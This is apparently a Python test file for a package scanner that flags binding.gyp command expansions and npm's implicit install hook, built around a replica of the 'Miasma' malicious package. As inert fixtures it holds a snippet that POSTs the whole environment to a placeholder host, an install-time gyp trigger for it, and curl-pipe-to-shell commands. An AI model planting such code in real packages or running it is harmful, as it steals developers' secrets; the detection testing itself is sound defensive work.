"""binding.gyp command expansions that run a file of the package, and the
install hook npm runs for a binding.gyp without an install script.

The replica test of Miasma v2 — a package with no install script, whose
binding.gyp runs its payload from a command expansion:

    {'targets': [{'target_name': 'stub',
                  'sources': ['<!(node index.js > /dev/null 2>&1 && echo stub.c)']}]}

— gave only the import-time MAJOR of index.js: scan_gyp listed an expansion
only when its command fetched or evaluated code, so nothing followed it to
index.js, and a --deps scan did not list the `node-gyp rebuild` npm runs for
a binding.gyp (the registry did). Now:

* an expansion that runs a file of the package is SC-INSTALL-HOOK INFO
  (inventory), its `cmd` the command as it runs, so a --deps scan and the
  registry follow it and escalate it to CRITICAL when the file fails the
  install-script test. Every form gyp runs counts: '<!(…)', '<!@(…)',
  '>!(…)', '^!(…)', an argv list '<!([…])', '<!pymod_do_main(module)'; a
  variable in the command is the package root ('<(module_root_dir)',
  '<(DEPTH)') or a path outside the package (any other). Include-path
  queries (`node -p "require('node-addon-api').include"`, pkg-config) and
  JSON files stay unlisted, and one file run by several expansions (sharp's
  eight `require('../lib/libvips')`) is listed once.
* a dependency whose package root holds a binding.gyp and whose package.json
  has no install or preinstall script (nor "gypfile": false) gets the
  implicit `node-gyp rebuild` hook, MAJOR, as in the registry.

Everything is inert text: hosts are .invalid, nothing is executed.
"""

import json
import os
import shutil
import tempfile
import unittest

from lazaret.scanner import core

EXFIL_JS = ("const data = JSON.stringify(process.env);\n"
            "fetch('https://collector.invalid/collect', { method: 'POST', body: data });\n")
MIASMA_GYP = "{'targets': [{'target_name': 'stub', 'sources': ['<!(node index.js > /dev/null 2>&1 && echo stub.c)']}]}\n"


def expansions(text, path="node_modules/p/binding.gyp"):
    return [(i["sev"], i["line"], i["cmd"]) for i in core.scan_gyp(path, text) if i["rule"] == "SC-INSTALL-HOOK"]


def write_tree(files):
    root = tempfile.mkdtemp(prefix="lz-gyp-")
    for rel, content in files.items():
        path = os.path.join(root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
    return root


class ScanGypExpansionTests(unittest.TestCase):
    def test_an_expansion_that_runs_a_package_file_is_inventory(self):
        self.assertEqual(expansions(MIASMA_GYP), [("INFO", 1, "node index.js > /dev/null 2>&1 && echo stub.c")])
        (issue,) = core.scan_gyp("node_modules/p/binding.gyp", MIASMA_GYP)
        self.assertEqual(issue["msg"], '"binding.gyp command expansion" script runs code at install time: '
                                       "'node index.js > /dev/null 2>&1 && echo stub.c'.")
        self.assertIn("follows it to that file", issue["why"])

    def test_every_form_gyp_runs(self):
        cases = {
            "'<!@(sh ./configure.sh)'": "sh ./configure.sh",
            "'>!(node ./late.js)'": "node ./late.js",
            "'^!(node ./gen.js)'": "node ./gen.js",
            "'<!([\"node\", \"tools/gen.js\"])'": "node tools/gen.js",
            "'<!([\"node\", \"tools/a b.js\"])'": "node 'tools/a b.js'",
            "'<!pymod_do_main(helper_mod arg)'": "python -m helper_mod arg",
            "'<!(node <(module_root_dir)/tools/gen.js)'": "node ./tools/gen.js",
            "'<!(node <(DEPTH)/tools/gen.js)'": "node ./tools/gen.js",
            "'<!(node -p \"require(\\'./lib/x\\').dir\")'": "node -p \"require('./lib/x').dir\"",
        }
        for value, cmd in cases.items():
            with self.subTest(value):
                self.assertEqual(expansions("{'variables': {'v': %s}}" % value), [("INFO", 1, cmd)])

    def test_what_is_not_listed(self):
        for value in ("'<!(node -p \"require(\\'node-addon-api\\').include\")'", "'<!(pkg-config --cflags glib-2.0)'",
                      "'<!(node -p \"require(\\'./package.json\\').version\")'", "'<!(node <(node_root_dir)/x.js)'",
                      "'<!(uname -s)'", "'<(module_root_dir)/x.js'", "'<!(python -c \"import sys\")'",
                      "'<!unknown_command(./x.js)'"):
            with self.subTest(value):
                self.assertEqual(expansions("{'variables': {'v': %s}}" % value), [])

    def test_suspicious_expansions_stay_critical(self):
        (issue,) = core.scan_gyp("binding.gyp", "{'variables': {'v': '<!(curl -s http://192.0.2.1/x)'}}")
        self.assertEqual(issue["sev"], "CRITICAL")
        (issue,) = core.scan_gyp("binding.gyp", "{'variables': {'v': '^!(node -e \"require(\\'child_process\\')"
                                                ".execSync(\\'curl https://c2.example.com/p | sh\\')\")'}}")
        self.assertEqual(issue["sev"], "CRITICAL")
        # (0.1.8) a download or evaluation tool is only a hint: eval of a name it never sets does nothing hostile
        (issue,) = core.scan_gyp("binding.gyp", "{'variables': {'v': '^!(node -e \"eval(x)\")'}}")
        self.assertEqual(issue["sev"], "MAJOR")
        self.assertIn("runs a download or evaluation command", issue["msg"])

    def test_a_file_run_by_several_expansions_is_listed_once_on_its_line(self):
        rows = ["{", " 'variables': {"]
        for name in ("minimumVersion", "includeDir", "libDir"):
            rows.append("  '%s': '<!(node -p \"require(\\'../lib/libvips\\').%s\")'," % (name, name))
        rows += [" },", " 'targets': [{'target_name': 'x', 'sources': ['<!(node ./other.js)']}]", "}"]
        found = expansions("\n".join(rows) + "\n", "node_modules/sharp/src/binding.gyp")
        self.assertEqual(found, [("INFO", 3, "node -p \"require('../lib/libvips').minimumVersion\""),
                                 ("INFO", 7, "node ./other.js")])

    def test_a_summary_of_inventory_only_is_inventory(self):
        values = ", ".join("'<!(node ./s%03d.js)'" % k for k in range(105))
        found = core.scan_gyp("binding.gyp", "{'variables': {'v': [%s]}}" % values)
        self.assertEqual(len(found), 101)
        self.assertEqual({i["sev"] for i in found}, {"INFO"})
        self.assertTrue(found[-1]["msg"].startswith("5 more binding.gyp actions and command expansions"))


class DependencyGypTests(unittest.TestCase):
    FILES = {
        "package.json": json.dumps({"name": "app", "version": "1.0.0"}),
        "index.js": "module.exports = 1;\n",
        # Miasma: no install script, the payload run from binding.gyp
        "node_modules/miasma/package.json": json.dumps({"name": "miasma", "version": "1.0.0", "main": "index.js"}),
        "node_modules/miasma/binding.gyp": MIASMA_GYP,
        "node_modules/miasma/index.js": EXFIL_JS,
        # a benign native module: the implicit hook, and inventory
        "node_modules/native/package.json": json.dumps({"name": "native", "version": "1.0.0"}),
        "node_modules/native/binding.gyp": "{'targets': [{'target_name': 'n', 'sources': ['<!(node ./gen.js)']}]}\n",
        "node_modules/native/gen.js": "console.log('n.cc');\n",
        # its own install script, "gypfile": false, a scoped package, a nested package.json
        "node_modules/built/package.json": json.dumps({"name": "built", "scripts": {"install": "node-gyp-build"}}),
        "node_modules/built/binding.gyp": "{'targets': [{'target_name': 'b'}]}\n",
        "node_modules/nogyp/package.json": json.dumps({"name": "nogyp", "gypfile": False}),
        "node_modules/nogyp/binding.gyp": "{'targets': [{'target_name': 'g'}]}\n",
        "node_modules/@scope/pkg/package.json": json.dumps({"name": "@scope/pkg"}),
        "node_modules/@scope/pkg/binding.gyp": "{'targets': [{'target_name': 's'}]}\n",
        "node_modules/deep/package.json": json.dumps({"name": "deep", "version": "1.0.0"}),
        "node_modules/deep/lib/package.json": json.dumps({"type": "module"}),
        "node_modules/deep/lib/binding.gyp": "{'targets': [{'target_name': 'l'}]}\n",
    }

    @classmethod
    def setUpClass(cls):
        cls.root = write_tree(cls.FILES)
        cls.res = core.scan_project(cls.root, include_deps=True)
        cls.hooks = sorted((i["file"].replace(os.sep, "/"), i["sev"], i["msg"]) for i in cls.res["issues"]
                           if i["rule"] == "SC-INSTALL-HOOK")

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.root, ignore_errors=True)

    def test_the_miasma_replica_is_critical(self):
        env = "sends environment variables over the network (the whole environment)"
        implicit = "\"install (implicit)\" script runs code at install time: 'node-gyp rebuild'."
        self.assertIn(("node_modules/miasma/binding.gyp", "CRITICAL", f"Install hook runs index.js, which {env}."),
                      self.hooks)
        self.assertIn(("node_modules/miasma/binding.gyp", "MAJOR", implicit), self.hooks)
        # index.js is judged as what the hook runs, not again as import-time code
        self.assertEqual([i for i in self.res["issues"] if i["rule"] == "SC-IMPORT-RISK"], [])

    def test_npm_builds_a_binding_gyp_without_an_install_script(self):
        implicit = {f for f, sev, msg in self.hooks if "install (implicit)" in msg}
        self.assertEqual(implicit, {"node_modules/miasma/binding.gyp", "node_modules/native/binding.gyp",
                                    "node_modules/@scope/pkg/binding.gyp"})
        self.assertIn(("node_modules/native/binding.gyp", "INFO",
                       "\"binding.gyp command expansion\" script runs code at install time: 'node ./gen.js'."),
                      self.hooks)


if __name__ == "__main__":
    unittest.main()
